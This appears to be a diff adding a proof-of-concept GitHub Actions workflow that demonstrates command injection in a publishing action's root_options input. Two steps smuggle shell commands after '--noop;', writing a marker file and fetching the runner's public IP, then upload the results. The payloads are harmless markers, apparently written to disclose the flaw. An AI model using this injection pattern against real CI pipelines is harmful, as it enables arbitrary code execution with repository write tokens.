@@ -1,0 +1,39 @@
+name: PoC - eval injection
+
+on:
+  workflow_dispatch:
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+
+    permissions:
+      contents: write
+
+    steps:
+      - name: checkout
+        uses: actions/checkout@v4
+
+      - name: test injection 1
+        uses: python-semantic-release/publish-action@v9.21.1
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          root_options: "--noop; echo 'INJECTED COMMAND EXECUTED' > injected.txt"
+
+      - name: test injection 2
+        uses: python-semantic-release/publish-action@v9.21.1
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          root_options: "--noop; curl https://ifconfig.me -o myip.txt"
+      
+      - name: upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: public-ip
+          path: myip.txt
+      
+      - name: upload other artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: injected-output
+          path: injected.txt
